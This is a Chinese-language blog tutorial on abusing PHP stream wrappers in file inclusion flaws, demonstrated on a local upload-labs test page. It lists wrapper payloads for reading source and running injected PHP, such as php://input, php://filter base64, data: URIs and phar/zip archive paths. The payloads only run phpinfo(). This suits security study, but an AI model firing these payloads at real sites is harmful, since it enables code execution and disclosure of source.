---
title: php 文件包含伪协议利用
date: 2019-01-03 15:34:47
tags: [php,文件包含]
categories:
  - [php]
  - [整理]
  - [文件包含]
---

# php 文件包含伪协议利用

---

## 重要配置

PHP.ini：

allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。

allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。

## PHP 中的封装协议(伪协议)

```
http://cn2.php.net/manual/zh/wrappers.php

file:///var/www/html 访问本地文件系统

ftp://<login>:<password>@<ftpserveraddress> 访问 FTP(s) URLs

data:// 数据流

http:// — 访问 HTTP(s) URLs

ftp:// — 访问 FTP(s) URLs

php:// — 访问各个输入/输出流

zlib:// — 压缩流

data:// — Data (RFC 2397)

glob:// — 查找匹配的文件路径模式

phar:// — PHP Archive

ssh2:// — Secure Shell 2

rar:// — RAR

ogg:// — Audio streams

expect:// — 处理交互式的流
```

## 利用file://协议

利用条件：双off的情况下也可以正常使用

file:// [文件的绝对路径和文件名]

```
includes.php?file=file://C:\phpStudy\PHPTutorial\WWW\upload-labs\upload\phpinfo.txt
```

![000](/img/FileContains/000.png)

## 利用php流input

*利用条件：*

1、allow_url_include = On。

2、对 allow_url_fopen 不做要求。

>/includes.php?file=php://input
>
>POST：`<?php phpinfo();?>`

![001](/img/FileContains/001.png)



## 利用php流filter

利用条件：双off的情况下也可以正常使用

通过指定末尾的文件，可以读取经 base64 加密后的文件源码。（读取敏感文件）

```php+HTML
?file=php://filter/convert.base64-encode/resource=includes.php
//includes.php是读取的文件
```

![002](/img/FileContains/002.png)

![003](/img/FileContains/003.png)

## 利用 data URIs

*利用条件：*

1、php 版本大于等于 php5.2

2、allow_url_fopen = On

3、allow_url_include = On

```shell
file=data:text/plain,<?php phpinfo();?>
file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
//%2b是+,需要使用url编码
```

![004](/img/FileContains/004.png)

## 利用phar

*利用条件：*

1、php 版本大于等于 php5.3.0

假设有个文件 phpinfo.txt，其内容为 `<?php phpinfo(); ?>`，打包成 zip 压缩包，如下：

> 路径：test.zip/test/phpinfo.txt

![004_1](/img/FileContains/004_1.png)

> ```shell
> # 相对路径
> includes.php?file=phar://upload/test.zip/test/phpinfo.txt
> 
> # 绝对路径
> includes.php?file=phar://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/test.zip/test/phpinfo.txt
> ```

![005](/img/FileContains/005.png)

![006](/img/FileContains/006.png)

## 利用zip://, bzip2://, zlib://协议

*利用条件：*

1、zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用

zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件。

### zip://协议

**使用方法：**

zip://archive.zip#dir/file.txt

zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]

> 使用 zip 协议，需要指定绝对路径，同时将 `#` 编码为 `%23`，之后填上压缩包内的文件。

```shell
# 绝对路径
includes.php?file=zip://C:\phpStudy\PHPTutorial\WWW\upload-labs\upload\test.zip%23phpinfo.txt

# 相对路径
includes.php?file=zip://upload/test.zip%23phpinfo.txt
```

![007](/img/FileContains/007.png)

![008](/img/FileContains/008.png)

### bzip2://协议

**使用方法：**

compress.bzip2://file.bz2

利用linux压缩命令

```shell
#bzip2 压缩
bzip2 phpinfo
#生成phpinfo.bz2,上传到目录
```



```
includes.php?file=compress.bzip2://./upload/phpinfo.bz2
```
![010](/img/FileContains/010.png)

![011](/img/FileContains/011.png)

### zlib://协议

**使用方法：**

compress.zlib://file.gz

```shell
# 绝对路径
includes.php?file=compress.zlib://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/phpinfo.txt

# 相对路径
includes.php?file=compress.zlib://./upload/phpinfo.txt
```

![012](/img/FileContains/012.png)

![013](/img/FileContains/013.png)